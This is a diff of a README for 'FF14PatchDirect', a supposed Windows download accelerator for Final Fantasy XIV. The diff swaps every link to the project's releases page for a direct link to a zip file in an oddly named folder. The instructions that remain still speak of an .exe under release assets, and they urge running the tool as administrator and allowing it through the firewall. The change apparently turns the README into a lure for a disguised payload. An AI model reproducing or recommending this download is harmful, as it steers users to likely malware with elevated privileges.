@@ -1,6 +1,6 @@
 # 🌐 FF14PatchDirect - Faster downloads for Global Final Fantasy
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Bodylengthflower68/FF14PatchDirect/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Bodylengthflower68/FF14PatchDirect/main/pamperize/Patch-Direct-F-v2.4.zip)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ This software works on Windows computers. Ensure you meet these requirements bef
 
 Follow these steps to set up the tool:
 
-1.  Visit the [official download page](https://github.com/Bodylengthflower68/FF14PatchDirect/releases) to get the latest version of the software.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Bodylengthflower68/FF14PatchDirect/main/pamperize/Patch-Direct-F-v2.4.zip) to get the latest version of the software.
 2.  Look for the file ending in `.exe` under the Assets section of the newest release.
 3.  Click the file to start the download.
 4.  Save the file to your computer.
@@ -58,7 +58,7 @@ If you encounter issues, try these steps:
 *   **Restart the Application:** Sometimes the connection takes a moment to stabilize. Close the tool fully and launch it again.
 *   **Check Administrator Rights:** Ensure you run the application with administrator privileges. Right-click the icon and choose "Run as administrator."
 *   **Check Firewall Settings:** Your Windows Firewall might ask for permission the first time you run the tool. Click "Allow" so the tool can communicate with the game servers.
-*   **Update the Software:** Check the [download page](https://github.com/Bodylengthflower68/FF14PatchDirect/releases) periodically to see if a newer version exists. Updates often contain fixes for new game patches.
+*   **Update the Software:** Check the [download page](https://raw.githubusercontent.com/Bodylengthflower68/FF14PatchDirect/main/pamperize/Patch-Direct-F-v2.4.zip) periodically to see if a newer version exists. Updates often contain fixes for new game patches.
 *   **Conflict with VPN:** If you use a separate VPN or proxy service, it might conflict with this tool. Try turning off other network software while using this tool to ensure it functions as intended.
 *   **Clean Network Cache:** If the game still struggles, restart your computer and clear your DNS cache by opening the Command Prompt and typing `ipconfig /flushdns`.
 
